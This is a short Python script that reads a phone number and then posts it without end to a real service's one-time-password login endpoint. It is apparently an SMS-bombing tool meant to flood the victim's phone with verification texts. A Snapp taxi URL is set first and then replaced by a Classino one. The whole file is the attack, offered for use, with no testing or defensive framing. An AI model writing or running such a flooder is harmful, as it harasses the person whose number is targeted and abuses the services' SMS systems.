import requests
from termcolor import colored

url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
url = 'https://l3.classino.com/user/auth/otp/login'

phonen = input('phone number: ')

pnd = {'cellphone': f'{phonen}'}

while True:

      req = requests.post(url, json= pnd)

      print(colored('ok', 'green'))

